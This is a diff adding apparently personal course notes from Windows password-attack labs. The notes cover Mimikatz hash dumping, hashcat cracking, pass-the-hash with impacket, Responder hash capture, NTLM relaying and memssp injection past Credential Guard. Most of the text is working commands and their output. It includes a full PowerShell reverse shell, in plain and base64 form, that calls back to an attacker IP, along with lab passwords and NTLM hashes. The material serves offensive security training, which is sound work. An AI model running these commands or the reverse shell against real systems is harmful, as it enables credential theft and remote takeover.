@@ -1,0 +1,249 @@
+Password Attacks
+
+Working with Password Hashes
+
+Cracking NTLM
+
+NTLM hashes (addresses many weaknesses of LM) are stored in the SAM database, NTLM hashes stored in the SAM database are not salted
+Mimikatz extracts password hashes from the Local Security Authority Subsystem (LSASS), running Mimikatz as Administrator (or higher) and have the SeDebugPrivilege access right enabled
+Can also elevate our privileges to the SYSTEM account with tools like PsExec, requires the SeImpersonatePrivilege access right to work
+One of the most common Mimikatz commands is sekurlsa::logonpasswords, which attempts to extract plaintext passwords and password hashes from all available sources. Since this generates a huge amount of output, we'll instead use lsadump::sam, which will extract the NTLM hashes from the SAM
+we obtained an NTLM hash and cracked it
+
+(mimikatz lsadump method)
+Get-LocalUser
+cd C:\tools
+ls
+.\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+User : nelly
+  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
+hashcat --help | grep -i "ntlm"
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+
+Lab 2. Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best66.rule for the cracking process and enter the plain text password as answer to this exercise
+
+target 192.168.54.227
+nadine/eSGJIzUp5nrr834QZBWK
+
+xfreerdp3 /u:nadine /p:eSGJIzUp5nrr834QZBWK /v:192.168.54.227
+xfreerdp3 /u:nelly /p:nicole1 /v:192.168.54.227
+
+cannot login !
+
+-------
+Passing NTLM
+
+we can leverage an NTLM hash without cracking it, pass-the-hash (PtH) technique, NTLM/LM password hashes are not salted and remain static between sessions, to another target as well
+Since Windows Vista, all Windows versions have UAC remote restrictions enabled by default
+We can use smbclient or CrackMapExec for SMB enumeration and management. We can use the scripts from the impacket library like psexec.py and wmiexec.py for command execution, but also via other protocols like RDP and WinRM if the user has the required rights, can also use Mimikatz to conduct pass-the-hash as well
+
+(smbclient method)
+privilege::debug
+token::elevate
+lsadump::sam
+User : Administrator
+  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+dir
+
+(impacket-psexec method, obtain an interactive shell)
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+hostname
+whoami
+
+(impacket-wmiexec method, obtain an interactive shell)
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+whoami
+
+-----
+Cracking Net-NTLMv2
+
+we may obtain code execution or a shell on a Windows system as an unprivileged user. This means that we cannot use tools like Mimikatz to extract passwords or NTLM hashes. In situations like these, we can abuse the Net-NTLMv2 (NTLMv2) network authentication protocol
+Net-NTLMv2 for this exercise since it is less secure than the more modern Kerberos protocol
+Responder tool is excellent for this. It includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server
+
+(responder method)
+nc 192.168.50.211 4444
+whoami
+net user paul
+
+ip a
+sudo responder -I tap0
+
+dir \\192.168.119.2\test
+
+[+] Listening for events... 
+[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
+
+cat paul.hash
+hashcat -hh | grep -i "ntlm"
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+
+Lab 2. Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application. Important: Add marketingwk01 to your /etc/hosts file with the corresponding IP address of the machine. After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag
+
+attacker 192.168.49.54
+target 192.168.54.210
+no rdp credential provided !
+
+nc 192.168.54.210 4444
+(UNKNOWN) [192.168.54.210] 4444 (?) : Connection refused !
+
+--------
+Relaying Net-NTLMv2
+
+the hash was too complex, we couldn't crack it, What we can assume based on the username is that the user may be a local administrator on FILES02. Therefore, we can try to use the hash on another machine in what is known as a relay attack
+we'll again use the dir command in the bind shell to create an SMB connection to our Kali machine. Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we'll forward it to FILES02, If files02admin is a local user on FILES02, the authentication is valid and therefore accepted by the machine, we can use it to authenticate and then execute commands over SMB with methods similar to those used by psexec or wmiexec
+we don't use the local Administrator user, the target system needs to have UAC remote restrictions disabled or the command execution will fail
+this attack with ntlmrelayx, another tool from the impacket library. This tool does the heavy lifting for us by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice
+
+(impacket-ntlmrelayx method)
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+(PowerShell reverse shell one-liner, which we'll base64-encode)
+
+nc -nvlp 8080
+
+nc 192.168.50.211 5555
+whoami
+dir \\192.168.119.2\test
+
+[*] Executed specified command on host: 192.168.50.212
+whoami
+hostname
+
+Lab 1. Use the methods from this section to get access to VM #2 (FILES02) of VM Group 1 and obtain the flag on the files02admin user's desktop. If the bind shell on VM #1 is terminated, it may take up to 1 minute until it is accessible again.
+
+attacker 192.168.49.54
+target 192.168.54.211 VM#1
+target 192.168.54.212 VM#2
+
+powershell_reverse_shell.ps1:
+$client = New-Object System.Net.Sockets.TCPClient('192.168.49.54',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+https://www.base64encode.org/
+
+base64:
+JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40OS41NCcsODA4MCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggIi4geyAkZGF0YSB9IDI+JjEiIHwgT3V0LVN0cmluZyApOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ==
+
+attacker:
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.54.212 -c "powershell -enc JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40OS41NCcsODA4MCk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggIi4geyAkZGF0YSB9IDI+JjEiIHwgT3V0LVN0cmluZyApOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKQ=="
+
+attacker:
+nc -nvlp 8080
+
+attacker:
+nc 192.168.54.211 5555
+hostname
+whoami
+files01\files02admin
+dir \\192.168.49.54\test
+
+attacker (impacket-ntlmrelayx):
+   + CategoryInfo          : ObjectNotFound: (???4???????????...???????????????:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException !
+
+Listener (nc 8080) also cannot catch reverse shell !
+
+-----
+Windows Credential Guard
+
+we may encounter other types of accounts, including Windows domain accounts, Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the lsass.exe process, Mimikatz can locate these stored credentials for us, Mimikatz we will need to run it as Administrator (or higher) and have the SeDebugPrivilege access right enabled
+
+xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
+(LSASS should have cached the domain user's information in memory. Now let's log out)
+
+(RDP into CLIENTWK246 as offsec, which is a local administrator, and enter lab as the password)
+cd C:\tools\mimikatz\
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+User Name         : offsec
+Domain            : CLIENTWK246
+Logon Server      : CLIENTWK246
+* NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
+User Name         : Administrator
+Domain            : CORP
+Logon Server      : SERVERWK248
+* NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
+
+(PtH attack)
+impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
+
+Virtualization-based Security (VBS) is a software technology which takes advantage of the hardware virtualization (Hyper-V) features that modern CPUs provide. These features can be used to, among other things, create and isolate secure regions of memory which become the root of trust of the operating system, VBS runs a hypervisor on the physical hardware rather than running on the operating system, VSM maintains this isolation through what is known as Virtual Trust Levels (VTLs), Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on, they were not enabled by default
+
+we'll focus on Credential Guard mitigation. When enabled, the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named LSAISO.exe (LSA Isolated) and communicates with the LSASS.exe process running in VTL0 through an RCP channel, With the new process running in VTL1, all the cached hashes and credential information is stored there, rather than in the memory of the LSASS process, meaning we can't access it
+
+Get-ComputerInfo
+DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
+DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
+
+cd C:\tools\mimikatz\
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+ * Username : Administrator
+         * Domain   : CORP
+           * LSA Isolated Data: NtlmHash
+             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
+             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
+             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
+             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
+
+we can't obtain the cached hashes because the LSASS process only has access to this information after it has been encrypted by the LSAISO process
+
+Microsoft provides quite a few authentication mechanisms as part of the Windows operating system such as Local Security Authority (LSA) Authentication, Winlogon, Security Support Provider Interfaces (SSPI), etc, By default, Windows provides several Security Support Providers (SSP) such as Kerberos Security Support Provider, NTLM Security Support Provider, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use
+Mimikatz already supports this through the memssp, which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the lsass.exe process without dropping any DLLs on disk
+
+privilege::debug
+misc::memssp
+Injected =)
+
+(use corp\administrator as test case)
+xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
+
+type C:\Windows\System32\mimilsa.log
+[00000000:00af2311] CORP\Administrator  QWERTY123!@#
+
+Lab 1. Start VM Group 1 and repeat the steps discussed in this section. What domain does the Administrator user extracted from Mimikatz belong to?
+
+target 
+SERVERWK248 192.168.54.248 
+Administrator/QWERTY123!@#
+
+CLIENTWK245 192.168.54.245
+offsec/lab
+
+xfreerdp3 /u:offsec /p:lab /v:192.168.54.245
+c:\tools\mimikatz\mimikatz.exe
+privilege::debug
+misc::memssp
+Injected =)
+(close RDP)
+
+xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.54.245 /dynamic-resolution
+(close RDP)
+
+xfreerdp3 /u:offsec /p:lab /v:192.168.54.245
+type C:\Windows\System32\mimilsa.log
+[00000000:0030d482] CORP\Administrator  QWERTY123!@#
+
+CORP
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
